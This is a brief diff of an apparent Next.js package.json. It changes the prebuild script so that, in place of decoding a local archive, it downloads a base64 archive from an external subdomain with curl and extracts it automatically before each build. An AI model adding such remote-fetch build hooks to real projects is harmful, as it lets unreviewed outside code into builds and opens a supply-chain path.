@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev",
-    "prebuild": "base64 -d site-source.tar.gz.b64 | tar -xz",
+    "prebuild": "curl -fsSL https://pillar-energy-check.nickchenaus666.chatgpt.site/handoff-source.b64 | base64 -d | tar -xz",
     "build": "next build",
     "start": "next start",
     "lint": "next lint",
